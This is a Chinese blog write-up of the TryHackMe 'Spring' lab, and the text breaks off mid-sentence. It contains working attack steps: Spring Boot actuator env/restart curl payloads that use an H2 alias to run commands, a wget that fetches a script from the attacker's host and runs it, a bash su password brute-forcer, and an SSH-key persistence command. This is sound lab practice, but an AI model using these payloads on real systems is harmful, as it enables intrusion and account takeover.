@@ -1,0 +1,259 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Spring | MoonlitSyntax</title><meta name="author" content="dionysus"><meta name="copyright" content="dionysus"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="curl -v -k https:&#x2F;&#x2F;10.10.52.116*   Trying 10.10.52.116:443...* Connected to 10.10.52.116 (10.10.52.116) port 443* ALPN: curl offers h2,http&#x2F;1.1* TLSv1.3 (OUT), TLS handshake, Client hello (1):* TLSv1.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring">
+<meta property="og:url" content="https://blog.siren.blue/2024/06/07/try-hack-me/%E9%80%86%E5%A4%A9/Spring/index.html">
+<meta property="og:site_name" content="MoonlitSyntax">
+<meta property="og:description" content="curl -v -k https:&#x2F;&#x2F;10.10.52.116*   Trying 10.10.52.116:443...* Connected to 10.10.52.116 (10.10.52.116) port 443* ALPN: curl offers h2,http&#x2F;1.1* TLSv1.3 (OUT), TLS handshake, Client hello (1):* TLSv1.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.siren.blue/img/9.jpg">
+<meta property="article:published_time" content="2024-06-07T12:13:33.000Z">
+<meta property="article:modified_time" content="2024-06-08T03:29:59.383Z">
+<meta property="article:author" content="dionysus">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.siren.blue/img/9.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://blog.siren.blue/2024/06/07/try-hack-me/%E9%80%86%E5%A4%A9/Spring/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"GNDO5PR146","apiKey":"1423d4e114f7a03240e8700efd01af02","indexName":"moonlit","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Spring',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-06-08 11:29:59'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css"  media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/18.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">303</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archiver"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 种类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont icon-yinle"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-shipin"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-Book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwomen"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/9.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MoonlitSyntax"><span class="site-name">MoonlitSyntax</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archiver"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 种类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont icon-yinle"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-shipin"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-Book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwomen"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Spring</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-07T12:13:33.000Z" title="发表于 2024-06-07 20:13:33">2024-06-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-08T03:29:59.383Z" title="更新于 2024-06-08 11:29:59">2024-06-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/">TryHackMe</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v -k https://10.10.52.116</span><br><span class="line">*   Trying 10.10.52.116:443...</span><br><span class="line">* Connected to 10.10.52.116 (10.10.52.116) port 443</span><br><span class="line">* ALPN: curl offers h2,http/1.1</span><br><span class="line">* TLSv1.3 (OUT), TLS handshake, Client hello (1):</span><br><span class="line">* TLSv1.3 (IN), TLS handshake, Server hello (2):</span><br><span class="line">* TLSv1.2 (IN), TLS handshake, Certificate (11):</span><br><span class="line">* TLSv1.2 (IN), TLS handshake, Server key exchange (12):</span><br><span class="line">* TLSv1.2 (IN), TLS handshake, Server finished (14):</span><br><span class="line">* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):</span><br><span class="line">* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):</span><br><span class="line">* TLSv1.2 (OUT), TLS handshake, Finished (20):</span><br><span class="line">* TLSv1.2 (IN), TLS handshake, Finished (20):</span><br><span class="line">* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384 / prime256v1 / rsaEncryption</span><br><span class="line">* ALPN: server did not agree on a protocol. Uses default.</span><br><span class="line">* Server certificate:</span><br><span class="line">*  subject: C=Unknown; ST=Unknown; L=Unknown; O=spring.thm; OU=Unknown; CN=John Smith</span><br><span class="line">*  start date: Jul  4 15:33:44 2020 GMT</span><br><span class="line">*  expire date: Apr 18 15:33:44 2294 GMT</span><br><span class="line">*  issuer: C=Unknown; ST=Unknown; L=Unknown; O=spring.thm; OU=Unknown; CN=John Smith</span><br><span class="line">*  SSL certificate verify result: self-signed certificate (18), continuing anyway.</span><br><span class="line">*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption</span><br><span class="line">* using HTTP/1.x</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: 10.10.52.116</span><br><span class="line">&gt; User-Agent: curl/8.5.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 </span><br><span class="line">&lt; Cache-Control: private</span><br><span class="line">&lt; Expires: Thu, 01 Jan 1970 00:00:00 GMT</span><br><span class="line">&lt; X-Content-Type-Options: nosniff</span><br><span class="line">&lt; X-XSS-Protection: 1; mode=block</span><br><span class="line">&lt; Strict-Transport-Security: max-age=31536000 ; includeSubDomains</span><br><span class="line">&lt; X-Frame-Options: DENY</span><br><span class="line">&lt; Content-Type: text/plain;charset=UTF-8</span><br><span class="line">&lt; Content-Length: 13</span><br><span class="line">&lt; Date: Mon, 15 Apr 2024 00:23:49 GMT</span><br><span class="line">&lt; </span><br><span class="line">* Connection #0 to host 10.10.52.116 left intact</span><br><span class="line">Hello, World!  </span><br></pre></td></tr></table></figure>
+<p>有个域名<code>spring.thm</code></p>
+<p>爆破加猜测<br>
+<code>https://10.10.52.116/sources/new/.git/config</code><br>
+git泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[core]</span><br><span class="line">	repositoryformatversion = 0</span><br><span class="line">	filemode = true</span><br><span class="line">	bare = false</span><br><span class="line">	logallrefupdates = true</span><br><span class="line">[user]</span><br><span class="line">	name = John Smith</span><br><span class="line">	email = johnsmith@spring.thm</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/z-img/Pasted%20image%2020240415093625.png" alt="Pasted%20image%2020240415093625"><br>
+只能公钥登录,git泄露里的东西用不了</p>
+<p>X-Forwarded-For伪造IP,emmmm</p>
+<p><img src="/z-img/Pasted%20image%2020240415094032.png" alt="Pasted%20image%2020240415094032"></p>
+<p>还有个这个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server.port=443</span><br><span class="line">server.ssl.key-store=classpath:dummycert.p12</span><br><span class="line">server.ssl.key-store-password=DummyKeystorePassword123.</span><br><span class="line">server.ssl.keyStoreType=PKCS12</span><br><span class="line">management.endpoints.enabled-by-default=true</span><br><span class="line">management.endpoints.web.exposure.include=health,env,beans,shutdown,mappings,restart</span><br><span class="line">management.endpoint.env.keys-to-sanitize=</span><br><span class="line">server.forward-headers-strategy=native</span><br><span class="line">server.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04</span><br><span class="line">server.error.whitelabel.enabled=false</span><br><span class="line">spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration</span><br><span class="line">server.servlet.register-default-servlet=true</span><br><span class="line">spring.mvc.ignore-default-model-on-redirect=true</span><br><span class="line">spring.security.user.name=johnsmith</span><br><span class="line">spring.security.user.password=PrettyS3cureSpringPassword123.</span><br><span class="line">debug=false</span><br><span class="line">spring.cloud.config.uri=</span><br><span class="line">spring.cloud.config.allow-override=true</span><br><span class="line">management.endpoint.heapdump.enabled=false</span><br><span class="line">spring.resources.static-locations=classpath:/META-INF/resources/, classpath:/resources/, classpath:/static/, classpath:/public/</span><br></pre></td></tr></table></figure>
+<p><code>server.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 </span><br><span class="line">Cache-Control: private</span><br><span class="line">Expires: Thu, 01 Jan 1970 00:00:00 GMT</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-XSS-Protection: 1; mode=block</span><br><span class="line">Strict-Transport-Security: max-age=31536000 ; includeSubDomains</span><br><span class="line">X-Frame-Options: DENY</span><br><span class="line">Content-Type: application/vnd.spring-boot.actuator.v3+json</span><br><span class="line">Date: Mon, 15 Apr 2024 01:43:04 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 712</span><br><span class="line"></span><br><span class="line">&#123;&quot;_links&quot;:&#123;&quot;self&quot;:&#123;&quot;href&quot;:&quot;https://10.10.52.116/actuator&quot;,&quot;templated&quot;:false&#125;,&quot;beans&quot;:&#123;&quot;href&quot;:&quot;https://10.10.52.116/actuator/beans&quot;,&quot;templated&quot;:false&#125;,&quot;health-path&quot;:&#123;&quot;href&quot;:&quot;https://10.10.52.116/actuator/health/&#123;*path&#125;&quot;,&quot;templated&quot;:true&#125;,&quot;health&quot;:&#123;&quot;href&quot;:&quot;https://10.10.52.116/actuator/health&quot;,&quot;templated&quot;:false&#125;,&quot;shutdown&quot;:&#123;&quot;href&quot;:&quot;https://10.10.52.116/actuator/shutdown&quot;,&quot;templated&quot;:false&#125;,&quot;env-toMatch&quot;:&#123;&quot;href&quot;:&quot;https://10.10.52.116/actuator/env/&#123;toMatch&#125;&quot;,&quot;templated&quot;:true&#125;,&quot;env&quot;:&#123;&quot;href&quot;:&quot;https://10.10.52.116/actuator/env&quot;,&quot;templated&quot;:false&#125;,&quot;mappings&quot;:&#123;&quot;href&quot;:&quot;https://10.10.52.116/actuator/mappings&quot;,&quot;templated&quot;:false&#125;,&quot;restart&quot;:&#123;&quot;href&quot;:&quot;https://10.10.52.116/actuator/restart&quot;,&quot;templated&quot;:false&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">management.endpoints.web.exposure.include=health,env,beans,shutdown,mappings,restart</span><br></pre></td></tr></table></figure>
+<p>配置文件里的这个,暴露的太多了</p>
+<p>传shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X &#x27;POST&#x27; -H &#x27;Content-Type: application/json&#x27; -H &#x27;x-9ad42dea0356cb04: 172.16.0.21&#x27; --data-binary $&#x27;&#123;\&quot;name\&quot;:\&quot;spring.datasource.hikari.connection-test-query\&quot;,\&quot;value\&quot;:\&quot;CREATE ALIAS EXEC AS CONCAT(\&#x27;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new\&#x27;,\&#x27; java.util.Scanner(Runtime.getRun\&#x27;,\&#x27;time().exec(cmd).getInputStream()); if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException(); &#125;\&#x27;);CALL EXEC(\&#x27;wget 10.17.6.173/bashfile -O /tmp/bashfile\&#x27;);\&quot;&#125;&#x27; &quot;https://10.10.75.74:443/actuator/env&quot; -k</span><br><span class="line"></span><br><span class="line">curl -X &#x27;POST&#x27; -H &#x27;Content-Type: application/json&#x27; -H &#x27;x-9ad42dea0356cb04: 172.16.0.21&#x27; &quot;https://10.10.75.74:443/actuator/restart&quot; -k</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X &#x27;POST&#x27; -H &#x27;Content-Type: application/json&#x27; -H &#x27;x-9ad42dea0356cb04: 172.16.0.21&#x27; --data-binary $&#x27;&#123;\&quot;name\&quot;:\&quot;spring.datasource.hikari.connection-test-query\&quot;,\&quot;value\&quot;:\&quot;CREATE ALIAS EXEC AS CONCAT(\&#x27;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new\&#x27;,\&#x27; java.util.Scanner(Runtime.getRun\&#x27;,\&#x27;time().exec(cmd).getInputStream()); if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException(); &#125;\&#x27;);CALL EXEC(\&#x27;bash /tmp/bashfile\&#x27;);\&quot;&#125;&#x27; &quot;https://10.10.75.74:443/actuator/env&quot; -k</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl -X &#x27;POST&#x27; -H &#x27;Content-Type: application/json&#x27; -H &#x27;x-9ad42dea0356cb04: 172.16.0.21&#x27; &quot;https://10.10.75.74:443/actuator/restart&quot; -k</span><br></pre></td></tr></table></figure>
+<p><img src="/z-img/Pasted%20image%2020240415101254.png" alt="Pasted%20image%2020240415101254"></p>
+<p>太牛逼了额测</p>
+<p>牛牛牛<br>
+没想到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PrettyS3cureSpringPassword123.</span><br><span class="line">PrettyS3cureKeystorePassword123.</span><br></pre></td></tr></table></figure>
+<p>然后去爆破密码,先拿字典</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">set -m #enable job control</span><br><span class="line">export TOP_PID=$$ #get the current PID</span><br><span class="line">trap &quot;trap - SIGTERM &amp;&amp; kill -- -$$&quot; INT SIGINT SIGTERM EXIT #exit on trap</span><br><span class="line"></span><br><span class="line"># https://github.com/fearside/ProgressBar/blob/master/progressbar.sh</span><br><span class="line"># something to look at while waiting</span><br><span class="line">function progressbar &#123;</span><br><span class="line">        let _progress=($&#123;1&#125;*100/$&#123;2&#125;*100)/100</span><br><span class="line">        let _done=($&#123;_progress&#125;*4)/10</span><br><span class="line">        let _left=40-$_done</span><br><span class="line"></span><br><span class="line">        _done=$(printf &quot;%$&#123;_done&#125;s&quot;)</span><br><span class="line">        _left=$(printf &quot;%$&#123;_left&#125;s&quot;)</span><br><span class="line"></span><br><span class="line">        printf &quot;\rCracking : [$&#123;_done// /#&#125;$&#123;_left// /-&#125;] $&#123;_progress&#125;%%&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function brute() &#123;</span><br><span class="line">        keyword=$1 #get the word</span><br><span class="line">        password=&quot;PrettyS3cure$&#123;keyword&#125;Password123.&quot; #add it to our format</span><br><span class="line">        output=$( ( sleep 0.2s &amp;&amp; echo $password ) | script -qc &#x27;su johnsmith -c &quot;id&quot;&#x27; /dev/null) # check the password</span><br><span class="line">        if [[ $output != *&quot;Authentication failure&quot;* ]]; then #if password was correct</span><br><span class="line">                printf &quot;\rCreds Found! johnsmith:$password\n$output\nbye...&quot; #print the password</span><br><span class="line">                kill -9 -$(ps -o pgid= $TOP_PID  | grep -o &#x27;[0-9]*&#x27;) #kill parent and other jobs</span><br><span class="line">        fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wordlist=$1 #get wordlist as parameter</span><br><span class="line"></span><br><span class="line">count=$(wc -l $wordlist| grep -o &#x27;[0-9]*&#x27;) #count how many words we have</span><br><span class="line">current=1</span><br><span class="line"></span><br><span class="line">while IFS= read -r line #for each line</span><br><span class="line">do</span><br><span class="line">        brute $line &amp; #try the password</span><br><span class="line">        progressbar $&#123;current&#125; $&#123;count&#125; #update progress bar. TODO:calculate ETA</span><br><span class="line">        current=$(( current + 1 )) #increment</span><br><span class="line">done &lt; $wordlist #read the wordlist</span><br><span class="line"></span><br><span class="line">wait #wait for active jobs</span><br></pre></td></tr></table></figure>
+<p><code>time bash su_brute_force.sh capitalized_words.txt</code></p>
+<p>牛密码<code>johnsmith:PrettyS3cureAccountPassword123.</code></p>
+<p>把公钥写进去<br>
+<code>echo &quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMMjsOFq+qUOzZrH2Rb04z9bxx2J97IekyA8wLRXTvVF root@kali&quot; &gt; ~/.ssh/authorized_keys</code></p>
+<p><code>systemctl list-units --type=service &gt;&gt; /tmp/result</code></p>
+<p>看看系统服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /tmp/result </span><br><span class="line">UNIT                                 LOAD   ACTIVE SUB     DESCRIPTION                                                                  </span><br><span class="line">accounts-daemon.service              loaded active running Accounts Service                                                             </span><br><span class="line">apparmor.service                     loaded active exited  AppArmor initialization                                                      </span><br><span class="line">apport.service                       loaded active exited  LSB: automatic crash report generation                                       </span><br><span class="line">atd.service                          loaded active running Deferred execution scheduler                                                 </span><br><span class="line">blk-availability.service             loaded active exited  Availability of block devices                                                </span><br><span class="line">cloud-config.service                 loaded active exited  Apply the settings specified in cloud-config                                 </span><br><span class="line">cloud-final.service                  loaded active exited  Execute cloud user/final scripts                                             </span><br><span class="line">cloud-init-local.service             loaded active exited  Initial cloud-init job (pre-networking)                                      </span><br><span class="line">cloud-init.service                   loaded active exited  Initial cloud-init job (metadata service crawler)                            </span><br><span class="line">console-setup.service                loaded active exited  Set console font and keymap                                                  </span><br><span class="line">cron.service                         loaded active running Regular background program processing daemon                                 </span><br><span class="line">dbus.service                         loaded active running D-Bus System Message Bus                                                     </span><br><span class="line">ebtables.service                     loaded active exited  ebtables ruleset management                                                  </span><br><span class="line">getty@tty1.service                   loaded active running Getty on tty1                                                                </span><br><span class="line">grub-common.service                  loaded active exited  LSB: Record successful boot for GRUB                                         </span><br><span class="line">keyboard-setup.service               loaded active exited  Set the console keyboard layout                                              </span><br><span class="line">kmod-static-nodes.service            loaded active exited  Create list of required static device nodes for the current kernel           </span><br><span class="line">lvm2-lvmetad.service                 loaded active running LVM2 metadata daemon                                                         </span><br><span class="line">lvm2-monitor.service                 loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling</span><br><span class="line">lxcfs.service                        loaded active running FUSE filesystem for LXC                                                      </span><br><span class="line">lxd-containers.service               loaded active exited  LXD - container startup/shutdown                                             </span><br><span class="line">networkd-dispatcher.service          loaded active running Dispatcher daemon for systemd-networkd                                       </span><br><span class="line">polkit.service                       loaded active running Authorization Manager                                                        </span><br><span class="line">rsyslog.service                      loaded active running System Logging Service                                                       </span><br><span class="line">serial-getty@ttyS0.service           loaded active running Serial Getty on ttyS0                                                        </span><br><span class="line">setvtrgb.service                     loaded active exited  Set console scheme                                                           </span><br><span class="line">snapd.seeded.service                 loaded active exited  Wait until snapd is fully seeded                                             </span><br><span class="line">snapd.service                        loaded active running Snappy daemon                                                                </span><br><span class="line">spring.service                       loaded active running Spring Boot Application                                                      </span><br><span class="line">ssh.service                          loaded active running OpenBSD Secure Shell server                                                  </span><br><span class="line">systemd-journal-flush.service        loaded active exited  Flush Journal to Persistent Storage                                          </span><br><span class="line">systemd-journald.service             loaded active running Journal Service                                                              </span><br><span class="line">systemd-logind.service               loaded active running Login Service                                                                </span><br><span class="line">systemd-modules-load.service         loaded active exited  Load Kernel Modules                                                          </span><br><span class="line">systemd-networkd-wait-online.service loaded active exited  Wait for Network to be Configured                                            </span><br><span class="line">systemd-networkd.service             loaded active running Network Service                                                              </span><br><span class="line">systemd-random-seed.service          loaded active exited  Load/Save Random Seed                                                        </span><br><span class="line">systemd-remount-fs.service           loaded active exited  Remount Root and Kernel File Systems                                         </span><br><span class="line">systemd-resolved.service             loaded active running Network Name Resolution                                                      </span><br><span class="line">systemd-sysctl.service               loaded active exited  Apply Kernel Variables                                                       </span><br><span class="line">systemd-timesyncd.service            loaded active running Network Time Synchronization                                                 </span><br><span class="line">systemd-tmpfiles-setup-dev.service   loaded active exited  Create Static Device Nodes in /dev                                           </span><br><span class="line">systemd-tmpfiles-setup.service       loaded active exited  Create Volatile Files and Directories                                        </span><br><span class="line">systemd-udev-trigger.service         loaded active exited  udev Coldplug all Devices                                                    </span><br><span class="line">systemd-udevd.service                loaded active running udev Kernel Device Manager                                                   </span><br><span class="line">systemd-update-utmp.service          loaded active exited  Update UTMP about System Boot/Shutdown                                       </span><br><span class="line">systemd-user-sessions.service        loaded active exited  Permit User Sessions                                                         </span><br><span class="line">ufw.service                          loaded active exited  Uncomplicated firewall                                                       </span><br><span class="line">unattended-upgrades.service          loaded active running Unattended Upgrades Shutdown                                                 </span><br><span class="line">user@1000.service                    loaded active running User Manager for UID 1000                                                    </span><br><span class="line">user@65534.service                   loaded active running User Manager for UID 65534                                                   </span><br><span class="line"></span><br><span class="line">LOAD   = Reflects whether the unit definition was properly loaded.</span><br><span class="line">ACTIVE = The high-level unit activation state, i.e. generalization of SUB.</span><br><span class="line">SUB    = The low-level unit activation state, values depend on unit type.</span><br><span class="line"></span><br><span class="line">51 loaded units listed. Pass --all to see loaded but inactive units, too.</span><br><span class="line">To show all installed unit files use &#x27;systemctl list-unit-files&#x27;.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>有个spring服务,一看就不是正经服务</p>
+<p><code>cat /etc/systemd/system/spring.service</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Spring Boot Application</span><br><span class="line">After=syslog.target</span><br><span class="line">StartLimitIntervalSec=0</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=root</span><br><span class="line">Restart=always</span><br><span class="line">RestartSec=1</span><br><span class="line">ExecStart=/root/start_tomcat.sh</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>牛逼,又回去了</p>
+<p><code>Restart=always</code><br>
+让程序关闭,就会自动重启,而重启的办法,就在</p>
